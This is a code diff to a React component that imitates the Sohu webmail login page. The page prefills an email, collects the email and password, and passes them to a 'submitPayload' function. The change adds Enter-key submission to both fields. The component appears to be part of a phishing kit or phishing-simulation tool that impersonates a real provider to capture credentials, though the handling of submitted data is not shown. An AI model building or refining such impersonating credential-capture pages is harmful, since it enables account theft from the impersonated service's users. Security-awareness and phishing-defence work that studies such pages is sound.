@@ -12,7 +12,7 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -22,6 +22,12 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -119,6 +125,7 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
                     placeholder="请输入您的邮箱" 
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
+                    onKeyDown={handleKeyDown}
                     className="flex-grow px-4 py-2.5 text-[14px] focus:outline-none"
                   />
                   <span className="px-4 text-gray-400 text-[14px] border-l border-gray-100">@sohu.com</span>
@@ -130,6 +137,7 @@ const SohuTheme: React.FC<SohuThemeProps> = ({ prefilledEmail }) => {
                     placeholder="请输入您的密码" 
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
+                    onKeyDown={handleKeyDown}
                     className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-red-400 transition-colors"
                   />
                 </div>
